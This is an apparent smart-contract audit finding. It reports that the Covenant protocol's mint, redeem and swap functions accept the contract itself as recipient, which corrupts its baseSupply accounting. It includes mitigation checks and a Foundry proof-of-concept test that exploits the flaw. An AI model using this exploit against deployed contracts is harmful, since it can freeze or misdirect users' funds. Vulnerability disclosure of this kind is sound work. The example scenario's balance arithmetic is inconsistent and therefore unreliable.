  "body": "** Description **\n\nThe Covenant protocol fails to validate the to parameter in three critical user-facing functions: `mint()`, `redeem()`, and `swap()`, allowing users to specify `address(this)` (the Covenant contract itself) as the `recipient`.\n\nThis causes tokens to be transferred to the contract itself while the accounting state (baseSupply) is updated as if tokens left the contract, creating a permanent accounting drift that violates the protocol's fundamental invariant and affects all users in the market, not just the attacker.\n\nAffected Functions:\n\n- `Covenant.redeem()`\n- `Covenant.swap()` when assetOut == BASE\n- `Covenant.mint()` for synthetic token minting\n\n=> Root Cause\n\nStep 1: Missing Validation\n\nThe protocol's validation layer (ValidationLogic.sol) checks various parameters but never validates that `to != address(this)`:\n\nNone of the validation functions (checkMintParams(), checkRedeemParams(), checkSwapParams()) include this critical check.\n\nStep 2: State Update Before Transfer\n\nWhen a user calls `redeem()` with `to = address(covenant)`:\n\n```javascript\nms.baseSupply = localBaseSupply - amountOut - protocolFees;\n```\nThe baseSupply is decreased, treating the operation as if tokens are leaving the contract.\n\nStep 3: Self-Transfer\n\nThe contract then executes:\n\n```javascript\nIERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut);\n```\n\nWhen `redeemParams.to = address(covenant)`, tokens are transferred from the contract to itself - they never actually leave.\n\nStep 4: Accounting Invariant Broken\n\nThe fundamental invariant `contract.balanceOf(baseToken) >= baseSupply + protocolFeeGrowth` is now violated:\n\n- Physical balance: Unchanged (tokens stayed in contract)\n- Accounted balance (baseSupply + protocolFeeGrowth): Decreased\n- Result: Unaccounted tokens trapped in the contract\n\n** Impact **\n\n-> Direct Impact\n\n1. Accounting Drift: The protocol's baseSupply no longer accurately reflects the collateral backing synthetic tokens, breaking the core invariant.\n\n2. Fee Extraction Beyond Earnings: The owner can call collectProtocolFee() to extract \"fees\" that include the unaccounted tokens, effectively stealing user funds.\n\n3. Failed Redemptions: Legitimate users attempting to redeem may be denied due to artificially low baseSupply, even though the contract holds sufficient physical tokens.\n\n-> Multi-User Impact\n\nThis bug affects ALL users in the market, not just the attacker:\n\n1. Shared Market State: The baseSupply variable in marketState[marketId] is global to the entire market. When one user creates accounting drift, it corrupts the state for all subsequent users.\n\n2. Subsequent User Losses: After the attack, innocent users may:\n\n- Have their redemptions fail due to insufficient baseSupply\n- Lose funds when the owner extracts unearned fees via collectProtocolFee()\n- Be unable to access their rightful collateral\n\n3. No User Protection: There's no way for innocent users to detect or prevent this attack before it happens. They simply interact with a corrupted market state.\n\n=> Example Scenario:\n\n- User A (attacker) deposits 100 ETH, mints tokens\n- User A redeems 50 ETH to address(covenant) → creates 50 ETH accounting drift\n- User B (innocent) deposits 60 ETH, mints tokens\n- User B tries to redeem their full position\n- Redemption fails because baseSupply shows only 50 ETH available, even though the contract holds 110 ETH (100 + 60 - 50 redeemed)\n- Owner calls `collectProtocolFee()` and extracts the 50 ETH drift, stealing User B's funds\n\n**Recommended Mitigation:** \n\nAdd validation in `ValidationLogic.sol` to reject self-transfers:\n\nIn `ValidationLogic.checkMintParams()`:\n\n```javascript\nfunction checkMintParams(MintParams calldata mintParams, uint256 localBaseSupply) internal pure {  \n    // ... existing checks ...  \n    if (mintParams.to == address(this)) revert Errors.E_InvalidRecipient();  \n}  \n```\n  \nIn `ValidationLogic.checkRedeemParams()`\n\n```javascript  \nfunction checkRedeemParams(RedeemParams calldata redeemParams, uint256 localBaseSupply) internal pure {  \n    // ... existing checks ...  \n    if (redeemParams.to == address(this)) revert Errors.E_InvalidRecipient();  \n}  \n```\n  \nIn `ValidationLogic.checkSwapParams()`\n\n```javascript  \nfunction checkSwapParams(SwapParams calldata swapParams, uint256 localBaseSupply) internal pure {  \n    // ... existing checks ...  \n    if (swapParams.to == address(this)) revert Errors.E_InvalidRecipient();  \n}\n```",
  "proof_of_concept": "Put this poc in C4PoC.t.sol:\n```javascript\n    function test_submissionValidity() public {  \n        uint256 baseAmountIn = 10e18;  \n        \n        // Step 1: Get market parameters from the already-created market  \n        MarketParams memory marketParams = MarketParams({  \n            baseToken: _mockBaseAsset,  \n            quoteToken: _mockQuoteAsset,  \n            curator: _mockOracle,  \n            lex: address(lex)  \n        });  \n        \n        // Step 2: Mint tokens normally  \n        IERC20(_mockBaseAsset).approve(address(covenant), baseAmountIn);  \n        (uint256 aTokenAmount, uint256 zTokenAmount) = covenant.mint(  \n            MintParams({  \n                marketId: _marketId,  \n                marketParams: marketParams,  \n                baseAmountIn: baseAmountIn,  \n                to: address(this),  \n                minATokenAmountOut: 0,  \n                minZTokenAmountOut: 0,  \n                data: hex\"\",  \n                msgValue: 0  \n            })  \n        );  \n        \n        // Step 3: Record state BEFORE the attack  \n        MarketState memory stateBefore = covenant.getMarketState(_marketId);  \n        uint256 contractBalanceBefore = IERC20(_mockBaseAsset).balanceOf(address(covenant));  \n        \n        // Step 4: EXPLOIT - Redeem to address(covenant) instead of address(this)  \n        uint256 redeemAmount = covenant.redeem(  \n            RedeemParams({  \n                marketId: _marketId,  \n                marketParams: marketParams,  \n                aTokenAmountIn: aTokenAmount / 2,  \n                zTokenAmountIn: zTokenAmount / 2,  \n                to: address(covenant), // BUG: Redeeming to the contract itself!  \n                minAmountOut: 0,  \n                data: hex\"\",  \n                msgValue: 0  \n            })  \n        );  \n        \n        // Step 5: Record state AFTER the attack  \n        MarketState memory stateAfter = covenant.getMarketState(_marketId);  \n        uint256 contractBalanceAfter = IERC20(_mockBaseAsset).balanceOf(address(covenant));  \n        \n        // Step 6: Verify the accounting invariant is broken  \n        uint256 accountedBalance = stateAfter.baseSupply + stateAfter.protocolFeeGrowth;  \n        \n        // The invariant should hold: contract balance >= baseSupply + protocolFeeGrowth  \n        // But after the attack, contract balance > baseSupply + protocolFeeGrowth  \n        assertGt(contractBalanceAfter, accountedBalance, \"Accounting drift detected!\");  \n        \n        // The difference equals the redeemAmount that was sent to the contract  \n        assertApproxEqAbs(contractBalanceAfter - accountedBalance, redeemAmount, 1e15, \"Drift equals redeem amount\");  \n        \n        // Physical balance unchanged (tokens transferred to self)  \n        assertEq(contractBalanceAfter, contractBalanceBefore, \"Physical balance unchanged\");  \n    }\n```\n\n-> Test Results:\n\nThe test successfully passes and demonstrates:\n\n- Physical balance: Remains at 10 ETH (unchanged)\n- Accounted balance: Drops to ~5 ETH (baseSupply + protocolFeeGrowth)\n- Unaccounted tokens: ~5 ETH trapped in the contract\n- Invariant violated: contract.balanceOf(baseToken) > baseSupply + protocolFeeGrowth",
